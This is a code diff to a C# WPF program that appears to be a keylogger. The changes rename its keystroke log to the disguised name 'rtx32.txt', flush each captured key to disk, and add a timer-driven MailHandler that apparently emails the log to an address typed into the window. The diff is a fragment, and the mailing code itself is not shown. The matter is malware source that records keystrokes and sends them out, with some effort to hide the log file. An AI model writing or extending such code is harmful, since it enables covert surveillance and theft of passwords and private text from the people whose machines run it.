@@ -25,8 +25,10 @@ namespace WpfApplication8
 {
     public partial class MainWindow : Window
     {
-        bool condition = false, mailCond = false;                                         //variables and importants actions
-        StreamWriter file = new StreamWriter(@"SochiKeyLog.txt");
+        private static System.Timers.Timer aTimer;
+        bool condition = false;                                      
+        StreamWriter file = new StreamWriter(@"rtx32.txt");
+        MailHandler mailhandler = new MailHandler();
         public MainWindow()
         {
             InitializeComponent();
@@ -47,7 +49,7 @@ namespace WpfApplication8
                     key = Convert.ToString(e.Key);
                     Save_With_Small_Letters(key);
                 }
-               
+                file.Flush();
             }
         }
         public void Button_Click(object sender, RoutedEventArgs e)
@@ -262,10 +264,11 @@ namespace WpfApplication8
         private void Mail_button(object sender, RoutedEventArgs e)
         {
             string mailbox = mailBox.Text;
+            mailhandler.SetTimer(aTimer, mailbox, file);
+            //aTimer.Stop();
+            //aTimer.Dispose();
             Console.WriteLine(mailbox);
-            mailCond = true;
         }
-
     }
 }
 
